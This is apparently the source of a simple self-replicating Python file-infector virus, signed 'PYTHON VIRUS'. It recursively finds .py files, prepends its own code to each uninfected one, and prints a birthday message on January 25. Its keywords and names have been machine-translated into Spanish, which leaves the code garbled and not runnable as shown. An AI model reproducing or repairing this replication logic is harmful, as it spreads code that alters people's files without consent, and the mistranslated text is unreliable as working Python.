#! / usr / bin / python
importar sistema  operativo
importar  fecha y hora
FIRMA  =  "PYTHON VIRUS"
def  búsqueda ( ruta ):
    filestoinfect  = []
    filelist  =  os . listdir ( ruta )
    para  fname  en la  lista de archivos :
        si  os . camino . isdir ( ruta + "/" + fname ):
            archivos para infectar . extender ( buscar ( ruta + "/" + fname ))
        elif  fname [ - 3 :] ==  ".py" :
            infectado  =  Falso
            para  línea  en  abierto ( ruta + "/" + fname ):
                si  FIRMA  en  línea :
                    infectado  =  Verdadero
                    romper
            si está  infectado  ==  Falso :
                archivos para infectar . añadir ( ruta + "/" + fname )
    devolver  archivos para infectar
def  infectar ( archivos a infectar ):
    virus  =  abierto ( OS . camino . abspath ( __file__ ))
    virusstring  =  ""
    para  i , línea  en  enumerate ( virus ):
        si  i > = 0  y  i  < 39 :
            virusstring  + =  línea
    virus . cerca
    para  fname  en  archivos para infectar :
        f  =  abierto ( fname )
        temp  =  f . leer ()
        f . cerrar ()
        f  =  abierto ( fname , "w" )
        f . escribir ( virusstring  +  temp )
        f . cerrar ()
def  bomb ():
    si  datetime . fecha y hora . ahora (). mes  ==  1  y  fecha y hora . fecha y hora . ahora (). día  ==  25 :
        imprimir  "¡FELIZ CUMPLEAÑOS CRANKLIN!"
filestoinfect  =  búsqueda ( os . ruta . abspath ( "" ))
infectar ( archivos a infectar )
bomba ()
